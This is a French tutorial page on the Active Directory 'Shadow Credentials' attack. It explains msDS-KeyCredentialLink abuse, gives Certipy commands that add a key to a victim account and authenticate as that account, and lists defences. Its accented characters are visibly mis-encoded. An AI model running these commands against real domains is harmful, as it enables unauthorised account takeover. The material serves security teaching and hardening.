---
title: Shadow Credentials
date: "2025-07-15"
draft: false
---

# üïµÔ∏è‚Äç‚ôÇÔ∏è Shadow Credentials

## Qu'est-ce que les Shadow Credentials ?

Les **Shadow Credentials** sont une technique d'attaque Active Directory permettant √† un attaquant d'ajouter des cl√©s d'authentification (cl√© publique) √† un compte utilisateur, lui permettant de s'authentifier sans mot de passe.

## üéØ Objectifs p√©dagogiques

- Comprendre le m√©canisme des cl√©s d'authentification dans AD
- Savoir comment exploiter Shadow Credentials pour l'√©l√©vation de privil√®ges

## üìã Exemples de vuln√©rabilit√©s et exploitation

### Vuln√©rabilit√©s courantes

- **Permissions d'√©criture sur msDS-KeyCredentialLink** : Si un utilisateur peut √©crire sur cet attribut, il peut ajouter une cl√© d'authentification.
- **Absence d'audit sur les modifications d'attributs sensibles** : Rend l'attaque difficile √† d√©tecter.

### Sc√©nario d'exploitation

1. **Ajout d'une cl√© √† un compte cible** :
   - L'attaquant g√©n√®re une paire de cl√©s (priv√©e/publique) et ajoute la cl√© publique √† l'attribut `msDS-KeyCredentialLink` du compte cible.
2. **Authentification avec la cl√© priv√©e** :
   - L'attaquant s'authentifie en tant que l'utilisateur cible sans conna√Ætre son mot de passe.

### Commandes d'exploitation avec Certipy

```bash
# G√©n√©rer une nouvelle cl√© et l'ajouter √† un compte cible
certipy-ad shadow -u attacker -p 'Password123!' -target-user victim -dc-ip 10.10.10.2 -domain ad.local

# S'authentifier avec la cl√© priv√©e g√©n√©r√©e
certipy-ad auth -u victim@ad.local -key <cl√©_priv√©e.pem> -dc-ip 10.10.10.2
```

## üõ°Ô∏è Bonnes pratiques

- Restreindre les droits d'√©criture sur l'attribut msDS-KeyCredentialLink
- Surveiller les modifications de cet attribut dans les logs
- Mettre √† jour et auditer r√©guli√®rement les permissions AD

## üìö Ressources utiles

- [Shadow Credentials Attack - SpecterOps](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [Certipy Documentation](https://github.com/ly4k/Certipy)
- [HackTricks - Shadow Credentials](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/shadow-credentials)

---

_Derni√®re mise √† jour : 15 juillet 2025_
